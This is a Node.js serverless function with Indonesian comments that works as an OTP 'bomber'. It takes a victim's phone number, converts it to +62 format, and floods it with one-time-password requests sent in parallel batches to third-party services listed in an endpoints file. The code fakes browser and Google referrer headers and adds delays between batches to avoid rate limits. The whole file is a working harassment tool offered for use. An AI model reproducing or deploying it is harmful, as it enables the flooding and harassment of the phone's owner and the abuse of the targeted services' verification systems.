const fetch = require('node-fetch');
const endpointsData = require('../endpoints.json');

module.exports = async (req, res) => {
  // Set CORS headers agar frontend bisa akses
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { phone, threads = 30 } = req.body;
  
  // Validasi nomor HP
  if (!phone || !/^[0-9]{10,15}$/.test(phone.replace(/^0/, ''))) {
    return res.status(400).json({ error: 'Invalid phone number format' });
  }

  // Format nomor ke +62
  let targetNumber = phone.trim();
  if (targetNumber.startsWith('0')) {
    targetNumber = '+62' + targetNumber.substring(1);
  } else if (!targetNumber.startsWith('+62')) {
    targetNumber = '+62' + targetNumber;
  }

  const endpoints = endpointsData.endpoints;
  
  // Fungsi mengirim satu request OTP
  const sendOtp = async (ep) => {
    let url = ep.url;
    let bodyObj = JSON.parse(JSON.stringify(ep.body));
    // Ganti placeholder {nomor} dengan target number
    const replaceInObject = (obj) => {
      for (let key in obj) {
        if (typeof obj[key] === 'string') {
          obj[key] = obj[key].replace(/{nomor}/g, targetNumber);
        } else if (typeof obj[key] === 'object') {
          replaceInObject(obj[key]);
        }
      }
    };
    replaceInObject(bodyObj);
    const body = JSON.stringify(bodyObj);
    
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 6000); // 6 detik timeout
    
    try {
      const response = await fetch(url, {
        method: ep.method || 'POST',
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          'Accept': 'application/json',
          'Accept-Language': 'id-ID,id;q=0.9',
          'Origin': 'https://www.google.com',
          'Referer': 'https://www.google.com/'
        },
        body: body,
        signal: controller.signal
      });
      clearTimeout(timeoutId);
      
      let responseText = '';
      try {
        responseText = await response.text();
      } catch(e) { responseText = 'Unable to read body'; }
      
      return {
        service: ep.name,
        status: response.status,
        ok: response.ok,
        response: responseText.substring(0, 150)
      };
    } catch (err) {
      clearTimeout(timeoutId);
      return {
        service: ep.name,
        status: 0,
        ok: false,
        error: err.message
      };
    }
  };

  // Batasi jumlah request paralel (threads)
  const maxConcurrent = Math.min(threads, 30); // Vercel limit koneksi simultan
  const results = [];
  
  for (let i = 0; i < endpoints.length; i += maxConcurrent) {
    const chunk = endpoints.slice(i, i + maxConcurrent);
    const chunkPromises = chunk.map(ep => sendOtp(ep));
    const chunkResults = await Promise.all(chunkPromises);
    results.push(...chunkResults);
    
    // Delay 0.3 detik antar chunk untuk mengurangi rate limit
    if (i + maxConcurrent < endpoints.length) {
      await new Promise(r => setTimeout(r, 300));
    }
  }

  const successful = results.filter(r => r.ok === true && r.status >= 200 && r.status < 300).length;
  const failed = results.length - successful;

  res.status(200).json({
    success: true,
    target: targetNumber,
    total_requests: results.length,
    successful: successful,
    failed: failed,
    details: results.map(r => ({
      service: r.service,
      status: r.status,
      ok: r.ok,
      ...(r.error ? { error: r.error } : {})
    }))
  });
};
